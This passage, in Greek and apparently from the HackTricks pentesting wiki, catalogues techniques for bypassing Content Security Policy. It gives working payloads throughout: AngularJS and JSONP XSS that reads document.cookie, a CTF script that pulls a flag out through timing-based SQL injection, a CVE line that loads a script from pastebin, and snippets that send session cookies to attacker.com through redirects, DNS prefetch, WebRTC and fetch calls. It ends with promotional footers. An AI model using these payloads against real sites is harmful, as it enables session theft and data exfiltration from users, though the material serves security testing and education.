Κατευθύνοντας αυτόν τον πίνακα στο φίλτρο `orderBy`, είναι δυνατό να επαναληφθεί, εκμεταλλευόμενο το τελικό στοιχείο (το αντικείμενο `window`), για να ενεργοποιηθεί μια παγκόσμια συνάρτηση όπως η `alert()`. Το παρακάτω απόσπασμα κώδικα επεξηγεί αυτήν τη διαδικασία:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Αυτό το απόσπασμα αναδεικνύει τη χρήση της οδηγίας `ng-focus` για να ενεργοποιηθεί το γεγονός, χρησιμοποιώντας το `$event.path|orderBy` για να τροποποιηθεί τον πίνακα `path`, και εκμεταλλευόμενο το αντικείμενο `window` για να εκτελεστεί η συνάρτηση `alert()`, αποκαλύπτοντας έτσι το `document.cookie`.

**Βρείτε άλλες παρακάμψεις στο Angular στη διεύθυνση** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS και επιτρεπόμενος τομέας (whitelisted domain)
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Μια πολιτική CSP που επιτρέπει μόνο συγκεκριμένους τομείς για τη φόρτωση σεναρίων σε μια εφαρμογή Angular JS μπορεί να παρακαμφθεί μέσω της κλήσης συναρτήσεων επιστροφής και ορισμένων ευάλωτων κλάσεων. Περισσότερες πληροφορίες για αυτήν την τεχνική μπορούν να βρεθούν σε έναν λεπτομερή οδηγό που είναι διαθέσιμος σε αυτό το [αποθετήριο git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).


Λειτουργικά φορτία:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Άλλα σημεία εκτέλεσης τυχαίου JSONP μπορούν να βρεθούν [εδώ](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (κάποια από αυτά έχουν διαγραφεί ή διορθωθεί)

### Παράκαμψη μέσω ανακατεύθυνσης

Τι συμβαίνει όταν ο CSP συναντά μια ανακατεύθυνση στην πλευρά του διακομιστή; Αν η ανακατεύθυνση οδηγεί σε μια διαφορετική προέλευση που δεν επιτρέπεται, τότε θα αποτύχει.

Ωστόσο, σύμφωνα με την περιγραφή στο [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), αν η ανακατεύθυνση οδηγεί σε μια διαφορετική διαδρομή, μπορεί να παρακαμφθούν οι αρχικοί περιορισμοί.

Εδώ υπάρχει ένα παράδειγμα:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Εάν το CSP είναι ρυθμισμένο σε `https://www.google.com/a/b/c/d`, αφού λαμβάνεται υπόψη η διαδρομή, τόσο τα scripts `/test` όσο και `/a/test` θα αποκλειστούν από το CSP.

Ωστόσο, το τελικό `http://localhost:5555/301` θα **ανακατευθυνθεί στην πλευρά του διακομιστή σε `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Επειδή πρόκειται για ανακατεύθυνση, η **διαδρομή δεν λαμβάνεται υπόψη**, και το **script μπορεί να φορτωθεί**, παρακάμπτοντας έτσι τον περιορισμό της διαδρομής.

Με αυτήν την ανακατεύθυνση, ακόμη και αν η διαδρομή καθοριστεί πλήρως, θα παρακαμφθεί.

Επομένως, η καλύτερη λύση είναι να διασφαλίσουμε ότι ο ιστότοπος δεν έχει καμία ευπάθεια ανοικτής ανακατεύθυνσης και ότι δεν υπάρχουν τομείς που μπορούν να εκμεταλλευτούνται στους κανόνες του CSP.

### Παράκαμψη του CSP με ανενεργό σήμανσης

Διαβάστε [εδώ](../dangling-markup-html-scriptless-injection/) πώς.

### 'unsafe-inline'; img-src \*; μέσω XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
Το `'unsafe-inline'` σημαίνει ότι μπορείτε να εκτελέσετε οποιοδήποτε script μέσα στον κώδικα (το XSS μπορεί να εκτελέσει κώδικα) και το `img-src *` σημαίνει ότι μπορείτε να χρησιμοποιήσετε στην ιστοσελίδα οποιαδήποτε εικόνα από οποιαδήποτε πηγή.

Μπορείτε να παρακάμψετε αυτό το CSP εξαγάγοντας τα δεδομένα μέσω εικόνων (σε αυτήν την περίπτωση το XSS καταχράται ένα CSRF όπου μια σελίδα προσβάσιμη από το bot περιέχει ένα SQLi και εξάγει τη σημαία μέσω μιας εικόνας):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Μπορείτε επίσης να καταχραστείτε αυτή τη διαμόρφωση για να φορτώσετε κώδικα JavaScript που έχει εισαχθεί μέσα σε μια εικόνα. Αν για παράδειγμα, η σελίδα επιτρέπει τη φόρτωση εικόνων από το Twitter, μπορείτε να δημιουργήσετε μια ειδική εικόνα, να την ανεβάσετε στο Twitter και να καταχραστείτε το "unsafe-inline" για να εκτελέσετε κώδικα JS (όπως ένα κανονικό XSS) που θα φορτώσει την εικόνα, θα εξάγει τον κώδικα JS από αυτήν και θα τον εκτελέσει: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Με τους Service Workers

Η συνάρτηση **`importScripts`** των Service Workers δεν περιορίζεται από το CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Εισαγωγή πολιτικής

**Έρευνα:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Αν ένα **παράμετρος** που στέλνετε εισάγεται μέσα στη **δήλωση** της **πολιτικής**, τότε μπορείτε να τροποποιήσετε την πολιτική με έναν τρόπο που την καθιστά άχρηστη. Μπορείτε να επιτρέψετε τον κώδικα 'unsafe-inline' με οποιαδήποτε από αυτές τις παρακάμψεις:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Επειδή αυτή η οδηγία θα **αντικαταστήσει υπάρχουσες οδηγίες script-src**.\
Μπορείτε να βρείτε ένα παράδειγμα εδώ: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Στο Edge είναι πολύ πιο απλό. Αν μπορείτε να προσθέσετε στο CSP μόνο αυτό: **`;_`** το **Edge** θα **απορρίψει** ολόκληρη την **πολιτική**.\
Παράδειγμα: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; μέσω XSS (iframe) - Χρονική επίθεση

Παρατηρήστε την έλλειψη της οδηγίας `'unsafe-inline'`\
Αυτή τη φορά μπορείτε να κάνετε το θύμα να **φορτώσει** μια σελίδα υπό **τον έλεγχό σας** μέσω **XSS** με ένα `<iframe>`. Αυτή τη φορά θα κάνετε το θύμα να αποκτήσει πρόσβαση στη σελίδα από όπου θέλετε να εξάγετε πληροφορίες (**CSRF**). Δεν μπορείτε να έχετε πρόσβαση στο περιεχόμενο της σελίδας, αλλά αν καταφέρετε να **ελέγξετε τον χρόνο που χρειάζεται η σελίδα για να φορτωθεί** μπορείτε να εξάγετε τις πληροφορίες που χρειάζεστε.

Αυτή τη φορά θα εξαχθεί ένας **σημαιοφόρος**, κάθε φορά που μαντεύεται σωστά ένας **χαρακτήρας** μέσω SQLi η **απόκριση** διαρκεί **περισσότερο χρόνο** λόγω της συνάρτησης sleep. Έπειτα, θα μπορείτε να εξάγετε τον σημαιοφόρο:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Μέσω των Bookmarklets

Αυτή η επίθεση θα περιλάμβανε κάποιο κοινωνικό μηχανικό, όπου ο επιτιθέμενος **πείθει τον χρήστη να σύρει και να αφήσει ένα σύνδεσμο πάνω από το bookmarklet του προγράμματος περιήγησης**. Αυτό το bookmarklet θα περιείχε **κακόβουλο κώδικα javascript** που, όταν σύρεται και κάνει κλικ, θα εκτελείται στο πλαίσιο του τρέχοντος παραθύρου του ιστοτόπου, **παρακάμπτοντας το CSP και επιτρέποντας την κλοπή ευαίσθητων πληροφοριών** όπως τα cookies ή τα tokens.

Για περισσότερες πληροφορίες [**ελέγξτε την αρχική αναφορά εδώ**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Παράκαμψη CSP περιορίζοντας το CSP

Σε [**αυτήν την ανάλυση CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), το CSP παρακάμπτεται εισάγοντας μέσα σε ένα επιτρεπόμενο iframe ένα πιο περιοριστικό CSP που απαγορεύει τη φόρτωση ενός συγκεκριμένου αρχείου JS που, στη συνέχεια, μέσω **προσβολής του πρωτοτύπου (prototype pollution)** ή **καταστροφής του DOM (dom clobbering)** επιτρέπει την κατάχρηση ενός διαφορετικού script για τη φόρτωση ενός αυθαίρετου script.

Μπορείτε να **περιορίσετε ένα CSP ενός Iframe** με το χαρακτηριστικό **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

Σε [**αυτό το CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), ήταν δυνατό μέσω **HTML injection** να **περιοριστεί** περισσότερο ένα **CSP**, έτσι ώστε ένα script που αποτρέπει το CSTI να απενεργοποιηθεί και, συνεπώς, η **ευπάθεια να γίνει εκμεταλλεύσιμη**.\
Το CSP μπορεί να γίνει πιο περιοριστικό χρησιμοποιώντας **HTML meta tags** και τα inline scripts μπορούν να απενεργοποιηθούν **αφαιρώντας** την **καταχώρηση** που επιτρέπει το **nonce** τους και **ενεργοποιώντας συγκεκριμένο inline script μέσω sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Εξαγωγή JS με το Content-Security-Policy-Report-Only

Αν καταφέρετε να κάνετε τον διακομιστή να απαντήσει με τον κεφαλίδα **`Content-Security-Policy-Report-Only`** με μια **τιμή που ελέγχετε εσείς** (ίσως λόγω ενός CRLF), μπορείτε να τον κατευθύνετε προς τον δικό σας διακομιστή και αν **τυλίξετε** το περιεχόμενο του JS που θέλετε να εξαγάγετε με **`<script>`** και επειδή είναι πολύ πιθανό να μην επιτρέπεται το `unsafe-inline` από το CSP, αυτό θα **ενεργοποιήσει ένα σφάλμα CSP** και μέρος του script (που περιέχει τις ευαίσθητες πληροφορίες) θα αποσταλεί στον διακομιστή από το `Content-Security-Policy-Report-Only`.

Για ένα παράδειγμα [**ελέγξτε αυτό το CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Διαρροή Πληροφοριών με το CSP και το Iframe

- Δημιουργείται ένα `iframe` που δείχνει σε μια διεύθυνση URL (ας το αποκαλέσουμε `https://example.redirect.com`) που επιτρέπεται από το CSP.
- Αυτή η διεύθυνση URL ανακατευθύνεται σε μια μυστική διεύθυνση URL (π.χ. `https://usersecret.example2.com`) που **δεν επιτρέπεται** από το CSP.
- Ακούγοντας το γεγονός `securitypolicyviolation`, μπορεί κανείς να καταγράψει την ιδιότητα `blockedURI`. Αυτή η ιδιότητα αποκαλύπτει τον τομέα της αποκλεισμένης URI, διαρρέοντας τον μυστικό τομέα στον οποίο ανακατευθύνθηκε αρχικά το URL.

Είναι ενδιαφέρον να σημειωθεί ότι οι περιηγητές όπως ο Chrome και ο Firefox έχουν διαφορετική συμπεριφορά στην χειρισμό των iframes όσον αφορά το CSP, οδηγώντας σε πιθανή διαρροή ευαίσθητων πληροφοριών λόγω μη ορισμένης συμπεριφοράς.

Μια άλλη τεχνική περιλαμβάνει την εκμετάλλευση του ίδιου του CSP για να εξάγει τον μυστικό υποτομέα. Αυτή η μέθοδος βασίζεται σε έναν αλγόριθμο δυαδικής αναζήτησης και στην προσαρμογή του CSP για να περιλαμβάνει συγκεκριμένους τομείς που αποκλείονται εκ των προτέρων. Για παράδειγμα, αν ο μυστικός υποτομέας αποτελείται από άγνωστους χαρακτήρες, μπορείτε επαναληπτικά να δοκιμάσετε διάφορους υποτομείς τροποποιώντας την κατευθυντήρια γραμμή CSP για να αποκλείσετε ή να επιτρέψετε αυτούς τους υποτομείς. Παρακάτω παρουσιάζεται ένα απόσπασμα που δείχνει πώς μπορεί να ρυθμιστεί το CSP για να διευκολύνει αυτήν τη μέθοδο:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Με την παρακολούθηση ποιων αιτημάτων αποκλείονται ή επιτρέπονται από το CSP, μπορεί κανείς να περιορίσει τους πιθανούς χαρακτήρες στο μυστικό υποτομέα, αποκαλύπτοντας τελικά τον πλήρη URL.

Και οι δύο μέθοδοι εκμεταλλεύονται τις λεπτομέρειες της υλοποίησης και της συμπεριφοράς του CSP στους περιηγητές, δείχνοντας πώς ακόμα και οι πολιτικές ασφαλείας που φαίνονται ασφαλείς μπορούν να διαρρεύσουν απροσδόκητα ευαίσθητες πληροφορίες.

Κόλπο από [**εδώ**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ανταμοιβές ευρημάτων ασφαλείας που ξεκινούν και τις κρίσιμες ενημερώσεις της πλατφόρμας

**Συμμετέχετε μαζί μας στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!

## Μη ασφαλείς τεχνολογίες για την παράκαμψη του CSP

### Υπερφόρτωση του ανταποκριτή PHP με buffer

Το PHP είναι γνωστό για το ότι προεπιλέγει να αποθηκεύει την απόκριση σε 4096 bytes. Επομένως, αν το PHP εμφανίζει ένα προειδοποιητικό μήνυμα, παρέχοντας αρκετά δεδομένα μέσα στις προειδοποιήσεις, η απόκριση θα αποσταλεί πριν από την κεφαλίδα CSP, προκαλώντας την αγνόηση της κεφαλίδας.\
Στη συνέχεια, η τεχνική αποτελείται βασικά στο να γεμίσει το buffer απόκρισης με προειδοποιήσεις, έτσι ώστε η κεφαλίδα CSP να μην αποσταλεί.

Ιδέα από [**αυτό το writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Αναδόμηση της σελίδας σφάλματος

Από [**αυτό το writeup**](https://blog.ssrf.kr/69) φαίνεται ότι ήταν δυνατό να παρακαμφθεί η προστασία του CSP φορτώνοντας μια σελίδα σφάλματος (πιθανώς χωρίς CSP) και αναδομώντας το περιεχόμενό της.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

Το SOME είναι μια τεχνική που καταχράται ένα XSS (ή περιορισμένο XSS) **σε ένα τέλος μιας σελίδας** για να **καταχραστεί** **άλλα τέλη της ίδιας προέλευσης**. Αυτό γίνεται φορτώνοντας το ευάλωτο τέλος από μια σελίδα επιτιθέμενου και στη συνέχεια ανανεώνοντας τη σελίδα επιτιθέμενου στο πραγματικό τέλος στην ίδια προέλευση που θέλετε να καταχραστείτε. Με αυτόν τον τρόπο το **ευάλωτο τέλος** μπορεί να χρησιμοποιήσει το αντικείμενο **`opener`** στο **payload** για να **έχει πρόσβαση στο DOM** του **πραγματικού τέλους που θέλετε να καταχραστείτε**. Για περισσότερες πληροφορίες, ανατρέξτε στο:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Επιπλέον, το **wordpress** έχει ένα τέλος **JSONP** στο `/wp-json/wp/v2/users/1?_jsonp=data` που θα **αντανακλά** τα **δεδομένα** που αποστέλλονται στην έξοδο (με τον περιορισμό μόνο γραμμάτων, αριθμών και τελείων).

Ένας επιτιθέμενος μπορεί να καταχραστεί αυτό το τέλος για να **δημιουργήσει μια επίθεση SOME** κατά του WordPress και να την ενσωματώσει μέσα στο `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` προσέξτε ότι αυτό το **script** θα **φορτωθεί** επειδή επιτρέπεται από το 'self'. Επιπλέον, και επειδή το WordPress είναι εγκατεστημένο, ένας επιτιθέμενος μπορεί να καταχραστεί την **επίθεση SOME** μέσω του **ευάλωτου** τέλους **κλήσης επιστροφής** που **παρακάμπτει το CSP** για να δώσει περισσότερα προνόμια σε έναν χρήστη, να εγκαταστήσει ένα νέο πρόσθετο...
Για περισσότερες πληροφορίες σχετικά με το πώς να πραγματοποιήσετε αυτήν την επίθεση, ανατρέξτε στο [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Παράκαμψη CSP Exfiltration

Εάν υπάρχει ένα αυστηρό CSP που δεν σας επιτρέπει να **αλληλεπιδράσετε με εξωτερικούς διακομιστές**, υπάρχουν μερικά πράγματα που μπορείτε πάντα να κάνετε για να εξαγάγετε τις πληροφορίες.

### Τοποθεσία

Μπορείτε απλά να ενημερώσετε την τοποθεσία για να στείλετε στον διακομιστή του επιτιθέμενου τις μυστικές πληροφορίες:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Ετικέτα Meta

Μπορείτε να ανακατευθύνετε εισάγοντας μια ετικέτα meta (αυτό είναι απλά μια ανακατεύθυνση, δεν θα διαρρεύσει περιεχόμενο)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Για να φορτώνονται οι σελίδες πιο γρήγορα, οι περιηγητές προχωρούν στην προ-επίλυση των ονομάτων κεντρικού υπολογιστή σε διευθύνσεις IP και τις αποθηκεύουν στην μνήμη cache για μελλοντική χρήση.\
Μπορείτε να οδηγήσετε έναν περιηγητή να προ-επιλύσει ένα όνομα κεντρικού υπολογιστή με την εντολή: `<link reol="dns-prefetch" href="something.com">`

Μπορείτε να εκμεταλλευτείτε αυτήν τη συμπεριφορά για να **διαρρεύσετε ευαίσθητες πληροφορίες μέσω αιτημάτων DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Ένας άλλος τρόπος:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Για να αποφευχθεί αυτό, ο διακομιστής μπορεί να στείλει τον HTTP κεφαλίδα:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Προφανώς, αυτή η τεχνική δεν λειτουργεί σε ανυπόδητους περιηγητές (bots)
{% endhint %}

### WebRTC

Σε αρκετές σελίδες μπορείτε να διαβάσετε ότι το **WebRTC δεν ελέγχει την πολιτική `connect-src`** του CSP.

Πραγματικά μπορείτε να _διαρρεύσετε_ πληροφορίες χρησιμοποιώντας ένα _αίτημα DNS_. Ελέγξτε αυτόν τον κώδικα:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Μια άλλη επιλογή:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Έλεγχος πολιτικών CSP σε απευθείας σύνδεση

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Αυτόματη δημιουργία CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Αναφορές

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ανταμοιβές ευρημάτων ασφαλείας που ξεκινούν και τις κρίσιμες ενημερώσεις της πλατφόρμας

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) **και** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **αποθετήρια του github.**

</details>
